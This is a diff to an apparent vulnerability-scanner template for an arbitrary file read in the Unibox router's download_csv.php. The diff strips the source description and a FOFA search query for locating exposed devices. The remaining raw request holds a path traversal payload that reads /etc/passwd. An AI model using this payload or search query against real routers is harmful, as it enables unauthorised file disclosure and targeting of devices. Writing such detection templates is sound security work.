@@ -3,12 +3,8 @@ info:
   name: Unibox路由器 download_csv.php 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/trmq08xqegghpm9g'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: trmq08xqegghpm9g
-    fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
 http:
 - raw:
   - 'GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1
